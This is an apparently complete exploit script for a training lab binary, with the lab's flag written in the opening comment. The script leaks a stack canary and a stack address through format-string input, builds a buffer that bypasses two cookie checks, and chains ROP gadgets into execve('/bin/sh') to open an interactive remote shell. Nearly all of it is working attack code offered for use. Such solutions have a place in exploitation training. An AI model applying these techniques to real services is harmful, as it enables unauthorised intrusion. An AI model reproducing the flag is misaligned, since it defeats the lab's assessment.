# lab8end: H4x0r5_d0nt_N33d_m3t4pHYS1c5

import sys
import struct

from pwn import *

def main():

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.159.129", 8841))
  sock.settimeout(1)

  if len(recvall(sock)) > 1:
    print("[*] Banner recieved, continuing exploitation")
  else:
    print("[-] Banner grab failed exiting...")
    exit(-1)

  canary = leak_cookie(sock)
  exploit(sock, canary)

  while True:
    try:
      sock.send(input("wetw0rk> ").encode('latin-1') + b"\n")
      print(recvall(sock).decode('latin-1'))
    except:
      print("[-] Exiting shell...")

# exploit: craft a buffer to bypass BOTH cookie checks and overwrite return address
def exploit(sockfd, canary):

  ptr = leak_stack_ptr(sockfd)+0x460 # leak a stack address to get pointer to "/bin/sh"

  print("[*] Calling readS() function")
  sockfd.send(b"A\n")
  recvall(sockfd)

  offset2chk1 = b"B" * 16             # offset to overwritten cookie in custom canary check function
                                      # xor    eax,0xdeadbeef
                                      # cmp    edx,eax
                                      # je     0x8049167 <findSomeWords+138>
  eax = struct.pack('<I', 0xdeadbeef) # ^
  
  offset2chk2 = b"B" * 4              # offset to cookie overwrite (second check)

  cookie = struct.pack('<I', canary)  # original leaked cookie

  offset2retAddr = b"B" * 4           # offset to overwritten return address
  retAddr  = generate_rop_chain(ptr)  # rop nop into rop chain ;)
  retAddr += b"/bin/sh\x00"

  print("[*] Crafting cookie check bypass for both functions")
  payload = offset2chk1 + eax + offset2chk2 + cookie + offset2retAddr + retAddr

  print("[+] Sending evil buffer, enjoy ur sh3ll\n")
  sockfd.send(payload)

# generate_rop_chain: make a call to execve("/bin/sh")
def generate_rop_chain(bin_sh_ptr):

  rop_gadgets = [
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    # ECX = NULL
    0x08049c73, # xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret [lab8A]
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    # EDX = NULL, EBX = *ptr to "/bin/sh"
    0x080938dd, # xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret [lab8A]
    bin_sh_ptr, # pointer to "/bin/sh"
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    # EAX = syscall number
    0x08096c12, # add eax, 0xb ; pop edi ; ret [lab8A]
    0x41414141, # filler
    0x0806f900, # int 0x80
  ]
  
  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# leak_stack_ptr: exactly what you think it does ;)
def leak_stack_ptr(sockfd):

  sockfd.send(b"%x\n")

  stack_leak = recvall(sockfd)[:8]
  addr = int((b"0x%b" % stack_leak), 16)

  print("[*] Leaked a stack address => 0x%x" % addr)

  return addr

# leak_cookie: leak the canary off the stack (on my system this was the 139th argument)
def leak_cookie(sockfd):

  sockfd.send(b"%139$x\n")
  
  stack_leak = recvall(sockfd)[:8]
  cookie = int((b"0x%b" % stack_leak), 16)

  print("[*] Leaked the canary => 0x%x" % cookie)

  return cookie


# recvall: get all data from the servers response, not just newlines
def recvall(sockfd):

  # i used the timeout to handle EOF from sockfd
  data = b''
  while True:
    try:
      data += sockfd.recv(4096)
    except:
      break

  return data

main()
